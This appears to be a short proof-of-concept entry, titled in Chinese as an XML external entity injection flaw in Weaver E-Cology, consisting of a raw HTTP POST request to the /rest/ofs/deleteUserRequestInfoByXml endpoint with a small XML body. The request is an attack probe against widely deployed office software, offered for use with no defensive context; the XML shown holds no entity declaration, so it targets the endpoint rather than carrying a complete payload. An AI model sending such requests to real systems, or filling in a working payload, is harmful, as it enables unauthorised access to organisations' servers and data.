泛微E-Cology XML外部实体注入漏洞

```
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: 
Content-Type: application/xml
Content-Length: 53

<M>
    <syscode>
        666
    </syscode>
</M>
```
